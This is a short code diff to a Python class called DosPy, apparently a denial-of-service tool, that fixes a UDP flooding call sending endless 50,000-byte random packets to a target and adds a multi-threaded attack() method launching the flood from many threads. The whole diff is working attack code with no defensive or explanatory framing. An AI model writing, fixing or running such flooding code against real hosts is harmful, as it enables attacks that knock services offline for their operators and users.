@@ -39,7 +39,7 @@ class DosPy(object):
             address = (self._host, self._port)
 
             while True:
-                sock.sendto(address, secrets.token_bytes(50000))
+                sock.sendto(secrets.token_bytes(50000), address)
         elif self._default_protocol == socket.SOCK_STREAM:
             address = (self._host, self._port)
 
@@ -53,3 +53,11 @@ class DosPy(object):
                     sock.close()
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     sock.connect(address)
+
+    def attack(self) -> bool:
+        for __ in range(self._threads_num):
+            th = Thread(target=self._attack_thread)
+            th.setDaemon(True)
+            th.start()
+
+        return True
